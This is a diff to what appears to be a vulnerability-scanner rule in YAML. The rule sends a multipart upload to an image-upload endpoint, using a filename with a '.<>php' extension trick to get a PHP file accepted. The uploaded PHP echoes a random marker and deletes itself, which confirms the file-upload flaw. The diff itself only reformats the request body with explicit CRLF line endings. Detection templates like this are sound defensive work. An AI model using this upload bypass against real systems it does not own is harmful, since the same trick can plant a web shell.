@@ -12,13 +12,14 @@ rules:
             path: /index.php?s=/home/page/uploadImg
             headers:
                 Content-Type: multipart/form-data; boundary=--------------------------835846770881083140190633
-            body: |-
-                ----------------------------835846770881083140190633
-                Content-Disposition: form-data; name="editormd-image-file"; filename="{{r1}}.<>php"
-                Content-Type: text/plain
-
-                <?php echo "{{r2}}"; unlink(__FILE__); ?>
-                ----------------------------835846770881083140190633--
+            body: "\
+                ----------------------------835846770881083140190633\r\n\
+                Content-Disposition: form-data; name=\"editormd-image-file\"; filename=\"{{r1}}.<>php\"\r\n\
+                Content-Type: text/plain\r\n\
+                \r\n\
+                <?php echo \"{{r2}}\"; unlink(__FILE__); ?>\r\n\
+                ----------------------------835846770881083140190633--\r\n\
+                "
             follow_redirects: false
         expression: response.status == 200 && response.body.bcontains(b"success")
         output:
